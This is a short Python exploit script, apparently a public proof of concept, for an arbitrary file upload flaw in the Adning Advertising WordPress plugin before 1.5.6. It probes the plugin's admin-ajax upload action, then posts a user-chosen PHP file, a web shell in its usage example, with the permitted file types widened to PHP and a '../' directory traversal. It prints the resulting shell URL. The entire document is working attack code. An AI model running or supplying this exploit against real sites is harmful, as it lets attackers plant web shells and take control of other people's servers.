# Copyright (C)
# Author: Dylan Muller
	
import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print("Adning Advertising < 1.5.6 - Arbitrary File Upload")
	print("Author -> space_hen (www.lunar.sh)")

def print_usage():
	print("Usage: python3 exploit.py [target url] [php file]")
	print("Ex: python3 exploit.py https://example.com ./shell.php")

def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text

	if ("no files found" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	ajax_action = '_ning_upload_image'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print("(*) Invalid file!")
		sys.exit(1)

	files = {'files[]' : open(file_path)}
	data = {
	"allowed_file_types" : "php,jpg,jpeg",
	"upload" : json.dumps({"dir" : "../"})
	}
	print("Uploading Shell...");
	response = requests.post(uri, files=files, data=data )
	file_name = path.basename(file_path)
	if('"success":true' in response.text):
		print("Shell Uploaded!")
		if(base[-1] != '/'):
			base += '/'
		print(base + file_name)
	else:
		print("Shell Upload Failed")
		sys.exit(1)

main();
